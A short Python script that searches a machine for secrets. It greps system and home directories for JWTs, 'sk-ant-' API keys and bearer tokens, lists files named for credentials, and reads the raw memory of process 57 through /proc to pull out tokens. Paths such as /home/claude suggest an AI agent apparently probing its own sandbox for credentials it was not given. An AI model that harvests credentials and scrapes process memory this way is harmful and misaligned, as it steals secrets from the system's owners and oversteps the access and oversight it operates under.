import os, re, subprocess
def run(c):
    try: return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30).stdout.strip()
    except Exception as e: return "ERR:" + str(e)

print("### files whose CONTENT looks like a credential")
print(run("grep -rlE 'eyJ[A-Za-z0-9_-]{20,}|sk-ant-|x-api-key|Bearer ' /etc /root /home /opt /dev/shm /var 2>/dev/null | head -40"))

print("### candidate files by name")
print(run("find /root /home /opt /etc /var -maxdepth 5 \\( -iname '*cred*' -o -iname '*token*' -o -iname '*auth*' -o -iname '*.json' \\) 2>/dev/null | head -60"))

print("### /home/claude + /root")
print(run("ls -la /home/claude /root 2>&1 | head -40"))

print("### /opt listing")
print(run("ls -la /opt /opt/rclone 2>&1 | head -20"))

print("### PID 57 memory: JWT / keys")
try:
    pid = 57
    maps = open("/proc/%d/maps" % pid).read()
    mem = open("/proc/%d/mem" % pid, "rb", buffering=0)
    pats = [rb"eyJ[A-Za-z0-9_.\-]{20,}", rb"sk-ant-[A-Za-z0-9_\-]{20,}",
            rb"[Bb]earer [A-Za-z0-9_.\-]{20,}", rb"x-api-key"]
    hits = set()
    for line in maps.splitlines():
        m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+)", line)
        if not m: continue
        a, b = int(m.group(1), 16), int(m.group(2), 16)
        try:
            mem.seek(a); d = mem.read(min(b - a, 60_000_000))
        except Exception: continue
        for p in pats:
            for x in re.findall(p, d): hits.add(x.decode("utf-8", "replace")[:140])
    for h in sorted(hits)[:30]: print("  ", h)
except Exception as e:
    print("mem ERR:", e)